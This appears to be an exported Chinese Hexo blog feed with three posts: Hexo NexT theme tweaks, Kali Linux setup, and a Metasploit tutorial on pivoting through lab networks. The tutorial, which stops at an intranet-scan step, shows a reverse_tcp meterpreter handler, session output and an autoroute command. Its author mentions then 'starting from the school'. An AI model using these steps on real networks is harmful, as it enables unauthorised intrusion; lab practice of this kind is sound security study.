<h5 id="点击出现爱心"><a href="#点击出现爱心" class="headerlink" title="点击出现爱心"></a>点击出现爱心</h5><p>复制页面中的代码，在路径blog/themes/next/source/js/src/中新建love.js文件，将复制的代码粘贴到该文件中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*网页鼠标点击特效（爱心）*/</span></span><br><span class="line">!<span class="function"><span class="keyword">function</span> (<span class="params">e, t, a</span>) </span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>) </span>&#123;<span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="number">0</span>; e &lt; s.length; e++) s[e].alpha &lt;= <span class="number">0</span> ? (t.body.removeChild(s[e].el), s.splice(e, <span class="number">1</span>)) : (s[e].y--, s[e].scale += <span class="number">.004</span>, s[e].alpha -= <span class="number">.013</span>, s[e].el.style.cssText = <span class="string">&quot;left:&quot;</span> + s[e].x + <span class="string">&quot;px;top:&quot;</span> + s[e].y + <span class="string">&quot;px;opacity:&quot;</span> + s[e].alpha + <span class="string">&quot;;transform:scale(&quot;</span> + s[e].scale + <span class="string">&quot;,&quot;</span> + s[e].scale + <span class="string">&quot;) rotate(45deg);background:&quot;</span> + s[e].color + <span class="string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>) </span>&#123;<span class="keyword">var</span> t = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> e.onclick &amp;&amp; e.onclick;e.onclick = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;t &amp;&amp; t(), o(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">e</span>) </span>&#123;<span class="keyword">var</span> a = t.createElement(<span class="string">&quot;div&quot;</span>);a.className = <span class="string">&quot;heart&quot;</span>, s.push(&#123;<span class="attr">el</span>: a,<span class="attr">x</span>: e.clientX - <span class="number">5</span>,<span class="attr">y</span>: e.clientY - <span class="number">5</span>,<span class="attr">scale</span>: <span class="number">1</span>,<span class="attr">alpha</span>: <span class="number">1</span>,<span class="attr">color</span>: c()&#125;), t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>) </span>&#123;<span class="keyword">var</span> a = t.createElement(<span class="string">&quot;style&quot;</span>);a.type = <span class="string">&quot;text/css&quot;</span>;<span class="keyword">try</span> &#123;a.appendChild(t.createTextNode(e))&#125; <span class="keyword">catch</span> (t) &#123;a.styleSheet.cssText = e&#125;t.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> <span class="string">&quot;rgb(&quot;</span> + ~~(<span class="number">255</span> * <span class="built_in">Math</span>.random()) + <span class="string">&quot;,&quot;</span> + ~~(<span class="number">255</span> * <span class="built_in">Math</span>.random()) + <span class="string">&quot;,&quot;</span> + ~~(<span class="number">255</span> * <span class="built_in">Math</span>.random()) + <span class="string">&quot;)&quot;</span>&#125;<span class="keyword">var</span> s = [];e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;<span class="built_in">setTimeout</span>(e, <span class="number">1e3</span> / <span class="number">60</span>)&#125;, i(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>), n(), r()&#125;(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>
<p>打开/blog/themes/next/layout/_layout.swig文件，在该文件的最后增加以下代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 页面点击小红心 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/js/src/love.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="添加看板娘"><a href="#添加看板娘" class="headerlink" title="添加看板娘"></a>添加看板娘</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> <span class="comment">--save hexo-helper-live2d</span></span><br></pre></td></tr></table></figure>

<p>在站点配置文件下配置</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">live2d:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">scriptFrom:</span> local</span><br><span class="line">  <span class="symbol">pluginRootPath:</span> live2dw/</span><br><span class="line">  <span class="symbol">pluginJsPath:</span> lib/</span><br><span class="line">  <span class="symbol">pluginModelPath:</span> assets/</span><br><span class="line">  <span class="symbol">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="symbol">debug:</span> <span class="literal">false</span></span><br><span class="line">  <span class="symbol">model:</span></span><br><span class="line">    <span class="symbol">use:</span> live2d-widget-model-shizuku</span><br><span class="line">  <span class="symbol">display:</span></span><br><span class="line">    <span class="symbol">position:</span> right</span><br><span class="line">    <span class="symbol">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="symbol">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="symbol">mobile:</span></span><br><span class="line">    <span class="symbol">show:</span> <span class="literal">true</span></span><br><span class="line">  <span class="symbol">react:</span></span><br><span class="line">    <span class="symbol">opacity:</span> <span class="number">0</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p><a href="https://live2d.fghrsh.net/demo/1.4.2/autoload.html">3种高配版</a></p>
<h5 id="增加站点运行时间"><a href="#增加站点运行时间" class="headerlink" title="增加站点运行时间"></a>增加站点运行时间</h5><p>在/blog/themes/next/layout/_partials/footer.swig最后添加如下代码</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;days&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> show<span class="constructor">_date_time()</span>&#123;</span><br><span class="line">    window.set<span class="constructor">Timeout(<span class="string">&quot;show_date_time()&quot;</span>, 1000)</span>;</span><br><span class="line">    BirthDay=<span class="keyword">new</span> <span class="constructor">Date(<span class="string">&quot;04/17/2017 15:13:14&quot;</span>)</span>;<span class="comment">//修改为自己的blog建站时间</span></span><br><span class="line">    today=<span class="keyword">new</span> <span class="constructor">Date()</span>;</span><br><span class="line">    timeold=(today.get<span class="constructor">Time()</span>-<span class="module-access"><span class="module"><span class="identifier">BirthDay</span>.</span></span>get<span class="constructor">Time()</span>);</span><br><span class="line">    sectimeold=timeold/<span class="number">1000</span></span><br><span class="line">    secondsold=<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>floor(sectimeold);</span><br><span class="line">    msPerDay=<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span></span><br><span class="line">    e_daysold=timeold/msPerDay</span><br><span class="line">    daysold=<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>floor(e_daysold);</span><br><span class="line">    e_hrsold=(e_daysold-daysold)*<span class="number">24</span>;</span><br><span class="line">    hrsold=setzero(<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>floor(e_hrsold));</span><br><span class="line">    e_minsold=(e_hrsold-hrsold)*<span class="number">60</span>;</span><br><span class="line">    minsold=setzero(<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>floor((e_hrsold-hrsold)*<span class="number">60</span>));</span><br><span class="line">    seconds=setzero(<span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>floor((e_minsold-minsold)*<span class="number">60</span>));</span><br><span class="line">    document.get<span class="constructor">ElementById(&#x27;<span class="params">days</span>&#x27;)</span>.innerHTML=<span class="string">&quot;已运行&quot;</span>+daysold+<span class="string">&quot;天&quot;</span>+hrsold+<span class="string">&quot;小时&quot;</span>+minsold+<span class="string">&quot;分&quot;</span>+seconds+<span class="string">&quot;秒&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> setzero(i)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;<span class="number">10</span>)</span><br><span class="line">    &#123;i=<span class="string">&quot;0&quot;</span> + i&#125;;</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line">show<span class="constructor">_date_time()</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="布局配置"><a href="#布局配置" class="headerlink" title="布局配置"></a>布局配置</h4><h5 id="配置背景"><a href="#配置背景" class="headerlink" title="配置背景"></a>配置背景</h5><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">blog\themes\next\source\css\_common\scaffolding\<span class="selector-tag">base</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative; <span class="comment">// Required by scrollspy</span></span><br><span class="line">  <span class="attribute">font-family</span>: <span class="variable">$font-family-base</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="variable">$font-size-small</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="variable">$line-height-base</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$text-color</span>;</span><br><span class="line">  <span class="attribute">background</span>:url(/images/background.png);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>:fixed;</span><br><span class="line">  <span class="attribute">background-position</span>:<span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  -webkit-<span class="attribute">background-size</span>: cover;</span><br><span class="line">  -o-<span class="attribute">background-size</span>: cover;</span><br><span class="line">  -moz-<span class="attribute">background-size</span>: cover;</span><br><span class="line">  -ms-<span class="attribute">background-size</span>: cover;</span><br><span class="line">  +tablet-mobile() &#123; <span class="attribute">padding-right</span>: <span class="number">0</span> <span class="meta">!important</span>; &#125;</span><br><span class="line">  +desktop-large() &#123; <span class="attribute">font-size</span>: <span class="variable">$font-size-medium</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h5><ul>
<li>主板块<br>blog\themes\next\source\css_schemes\Pisces_layout.styl<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="variable">$content-desktop-padding</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="variable">$content-wrap</span>;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">700px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">16px</span>;</span><br><span class="line"></span><br><span class="line">  +tablet() &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">16px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">min-height</span>: auto;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">16px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>侧边<br>blog\themes\next\source\css_schemes\Pisces_sidebar.styl<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.sidebar-inner</span> &#123;</span><br><span class="line">  <span class="comment">//padding: 20px 10px 0;</span></span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">width</span>: <span class="variable">$sidebar</span>-desktop;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$text</span>-color;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="variable">$box</span>-shadow;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="keyword">if</span> (hexo-config(<span class="string">&#x27;motion.enable&#x27;</span>) and hexo-config(<span class="string">&#x27;motion.transition.sidebar&#x27;</span>)) &#123; <span class="attribute">opacity</span>: <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">  &amp;<span class="selector-class">.affix</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">top</span>: <span class="variable">$sidebar</span>-offset;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &amp;<span class="selector-class">.affix-bottom</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>blog\themes\next\source\css_common\components\back-to-top.styl</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">.back-to-top</span> &#123;</span><br><span class="line">  <span class="attr">visibility:</span> <span class="string">hidden;</span></span><br><span class="line">  <span class="attr">margin:</span> <span class="string">(20px</span> <span class="bullet">-</span> <span class="string">$sidebar-offset)</span> <span class="string">-10px</span> <span class="string">-20px;</span></span><br><span class="line">  <span class="attr">background:</span> <span class="string">rgba(255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.5</span><span class="string">);</span></span><br><span class="line">  <span class="attr">font-size:</span> <span class="string">$b2t-font-size;</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="string">$b2t-opacity;</span></span><br><span class="line">  <span class="attr">cursor:</span> <span class="string">pointer;</span></span><br><span class="line">  <span class="attr">text-align:</span> <span class="string">center;</span></span><br><span class="line">  <span class="attr">border-radius:</span> <span class="string">16px;</span></span><br><span class="line">  <span class="string">&amp;:hover</span> &#123; <span class="attr">opacity:</span> <span class="string">$b2t-opacity-hover;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">+tablet-mobile()</span> &#123;</span><br><span class="line">    <span class="string">hide()</span> <span class="string">if</span> <span class="string">not</span> <span class="string">hexo-config(&#x27;sidebar.onmobile&#x27;);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">&amp;.back-to-top-on</span> &#123;</span><br><span class="line">    <span class="attr">visibility:</span> <span class="string">visible;</span></span><br><span class="line">    <span class="string">the-transition();</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>blog\themes\next\source\css_schemes\Pisces_layout.styl</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: static;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="variable">$sidebar-desktop</span>;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: none</span><br><span class="line">  border-radius: <span class="number">16px</span>;</span><br><span class="line"></span><br><span class="line">  +tablet-mobile() &#123;</span><br><span class="line">    hide();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>kali更新完善</title>
    <url>/2019/10/29/kali%E6%9B%B4%E6%96%B0%E5%AE%8C%E5%96%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>工欲善其事，必先利其器。kali是几年来，hacker使用最多的一款操作系统。现在已有5年的历史了，现在最新版本为2019.3.</p>
<a id="more"></a>

<hr>
<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>一般kali我们都是装在虚拟机中。这里的ios镜像我们可以选择ios和vm版本</p>
<ul>
<li><a href="https://www.kali.org/downloads/">ios 版本</a>的可以装在vm中或者是真实的生产环境(推荐MATE版本)</li>
<li><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">vm版本</a>的我们可以使用</li>
</ul>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>由于是kali的更新完善，这里不在对kali的安装进行操作。推荐大家直接上手vm版本的</p>
<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><p>用户唯一：root<br>密码默认：toor</p>
<h4 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vi/etc/apt/sources.list</span></span><br><span class="line"><span class="comment">#在vi的编辑下添加以下国内镜源</span></span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#清华大学</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment">#并将kali自带的镜像源注释，以便加快我们apt的安装使用</span></span><br><span class="line"><span class="comment">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure>
<h4 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span><span class="built_in"> upgrade </span>&amp;&amp; apt-<span class="builtin-name">get</span> dist-upgrade               # 刷新系统&amp;升级系统&amp;版本升级</span><br></pre></td></tr></table></figure>

<h4 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h4><ul>
<li>Settings–&gt;Privacy–&gt;screen lock off     # 关闭锁屏</li>
<li>Settings–&gt;Power–&gt;Blank screen    #关闭黑屏</li>
<li>Settings–&gt;Devices–&gt;Keyboard –&gt; Screenshots–&gt;Save a screenshot of an area to Pictures    #截图的快捷键(存储到Picture)</li>
<li>Settings–&gt;Background     #设置你的<a href="https://raw.githubusercontent.com/alpha302/cloudimg/master/100.jpg">背景图片</a></li>
<li>Settings –&gt; Universal Access -&gt; Seeing -&gt; Large Text          #放大字体，很舒服</li>
</ul>
<h4 id="系统中文"><a href="#系统中文" class="headerlink" title="系统中文"></a>系统中文</h4><p>不推荐使用中文的操作系统，能英文还是英文优先<br>也不推荐大家使用系统的Region&amp;Language去切换中文，因为这样设置的系统不是完全中文</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dpkg-reconfigure locales</span></span><br><span class="line"><span class="comment">#选择字符编码：en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8</span></span><br><span class="line"><span class="comment">#选择字符：zh_CN.UTF-8（记得用空格）</span></span><br><span class="line"><span class="comment">#重启生效</span></span><br></pre></td></tr></table></figure>
<h4 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt-get install fcitx       #安装输入法框架</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install fcitx-googlepinyin    #安装google拼音输入法</span></span><br><span class="line"><span class="comment">#重启生效</span></span><br><span class="line">root@kali:~<span class="comment"># im-config</span></span><br><span class="line">将google拼音设置为首选项</span><br><span class="line">验证，ctrl+空格切换输入法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="网络问题"><a href="#网络问题" class="headerlink" title="网络问题"></a>网络问题</h4><p>可能有些小伙伴一装上kali就上不了网。可能ping不同外网，可能只能ping物理机，可能没有eth0(默认)，可能之前能连网，但换了一个环境就不行等等的问题<br>这些问题，可能的原因可以是 ：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">- <span class="number">1</span> 你物理机是网线连接，你的kali是用的直连，自己没配置/etc/network/interface</span><br><span class="line">- <span class="number">2</span> 物理机是wife连接，你的kali 是nat连接，你的/etc/NetworkManager/NetworkManger.conf 没有设置true</span><br><span class="line">- <span class="number">3</span> 你的物理机的服务VMware DHCP Service，VMware NAT Service停止了</span><br><span class="line">- <span class="number">4</span> 还有的时候是在虚拟网络编译器中Vmnet信息中桥接模式选择的自动，有些网卡不是很友好，可以换成ipcofig中使用的网卡</span><br><span class="line">- <span class="number">5</span> 最后一个解决的办法，实在没招了，点开vmware 左上角的编辑选择虚拟网络编译器，点击更改设置，还原默认设置即可</span><br></pre></td></tr></table></figure>
<h4 id="安装代理"><a href="#安装代理" class="headerlink" title="安装代理"></a>安装代理</h4><p>为了方便日后的使用还是先装一下代理工具shadowsocks-qt5</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt-get update</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install shadowsocks-qt5</span></span><br></pre></td></tr></table></figure>
<p>在系统中搜索shadowsocks-qt5<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/YEVPPYH.png"></p>
<p>打开做设置如图<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/233.png"></p>
<p>测试<br>对firefox做代理<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/ZN8Y9L9ZR.png"></p>
<p>完成<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/Screenshot%20from%202019-10-29%2010-42-00.png"></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>别忘了给kali做一份快照</p>
<blockquote>
<p>init 0 关机大吉</p>
</blockquote>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>msf多层内网穿透(基础篇)</title>
    <url>/2019/10/28/msfconsole/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>先模拟多层内网，摸清后渗透的使用，再从学校入手。<br>内网渗透test</p>
<a id="more"></a>

<hr>
<h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/B%60O%7E0%5BU%5DFA1.png"></p>
<p>以kali为攻击机，xp作为跳板主机，win7是内网主机</p>
<p>xp主机是提供web，FTP等服务，已被kali机获取shell</p>
<p>win7正常不与外网访问，和DMZ区域处于同一网段</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用VMware的主机模式，构建虚拟局域网。<strong>查看<a href="https://cx-a.com/huamu/88.html">Host-only模式详解</a></strong></p>
<p>虚拟网络编译器中添加两块网卡vm1，vm2。 <strong>类型</strong>：主机模式<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%25X382%5DSO.png"></p>
<p>设置xp为双网卡vm1,vm2。其余按网络拓扑分配网卡</p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/3%25%5BZ%7E%7B%7E73UK6VPP.png"></p>
<p><strong>查看ip</strong></p>
<p>kali<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/SQ7%40K20%24P.png"></p>
<p>xp<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/B%60SVVA_1NGSQ07.png"></p>
<p>win7<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%5BPF_T.png"></p>
<p>至此环境布置完毕</p>
<h2 id="拿下跳板以及端口转发"><a href="#拿下跳板以及端口转发" class="headerlink" title="拿下跳板以及端口转发"></a>拿下跳板以及端口转发</h2><p>以社工等方法获取到xp主机的shell<br>通过metasploit会话，使用Windows xp靶机作为跳板，扫描和攻击内部网络主机</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#kali msf</span></span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span><span class="number">.252</span><span class="number">.128</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.252</span><span class="number">.128</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">4444</span></span><br><span class="line">lport =&gt; <span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.252</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[*] Sending stage (<span class="number">180291</span> bytes) to <span class="number">192.168</span><span class="number">.252</span><span class="number">.130</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.252</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.252</span><span class="number">.130</span>:<span class="number">1814</span>) at <span class="number">2019</span>-<span class="number">11</span>-<span class="number">16</span> <span class="number">12</span>:<span class="number">44</span>:<span class="number">58</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  <span class="number">1</span></span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">MTU          : <span class="number">1520</span></span><br><span class="line">IPv4 Address : <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  <span class="number">2</span></span><br><span class="line">============</span><br><span class="line">Name         : AMD PCNET Family PCI Ethernet Adapter - rface</span><br><span class="line">Hardware MAC : <span class="number">00</span>:0c:<span class="number">29</span>:dd:e6:<span class="number">94</span></span><br><span class="line">MTU          : <span class="number">1500</span></span><br><span class="line">IPv4 Address : <span class="number">192.168</span><span class="number">.85</span><span class="number">.129</span></span><br><span class="line">IPv4 Netmask : <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  <span class="number">3</span></span><br><span class="line">============</span><br><span class="line">Name         : VMware Accelerated AMD PCNet Adapter - rface</span><br><span class="line">Hardware MAC : <span class="number">00</span>:0c:<span class="number">29</span>:dd:e6:<span class="number">9e</span></span><br><span class="line">MTU          : <span class="number">1500</span></span><br><span class="line">IPv4 Address : <span class="number">192.168</span><span class="number">.252</span><span class="number">.130</span></span><br><span class="line">IPv4 Netmask : <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>可以看到xp是双网卡，发现另一内网段 192.168.85.0/24。</p>
<p>对该内网进行渗透</p>
<ol>
<li><p>添加内网的路由</p>
 <figure class="highlight r"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span>    <span class="comment">#添加目标网段路由规则，获取内部网络访问通道</span></span><br><span class="line">meterpreter &gt; route flush  <span class="comment">#不用的时候,记得删掉就行</span></span><br></pre></td></tr></table></figure>
<p> <img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-11-16%2016-15-39%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
</li>
<li><p>扫描内网主机</p>
